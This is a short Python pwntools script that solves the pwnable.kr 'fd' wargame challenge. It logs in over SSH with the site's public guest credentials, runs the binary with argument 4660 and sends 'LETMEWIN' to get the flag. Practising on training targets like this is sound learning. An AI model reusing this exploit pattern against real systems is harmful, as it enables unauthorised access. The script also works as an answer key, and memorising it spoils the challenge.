#!/usr/bin/python

from pwn import *

# if we connect to the host in the shell we will use the command: ssh fd@pwnable.kr -p 2222
# the parameters are username host password port
shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222)

#we run the fd file and the input arguments are fd and 4660 
process = shell.process(executable='./fd', argv=['fd','4660'])

#send the required data
process.sendline('LETMEWIN')

#print the received bytes
print process.recv()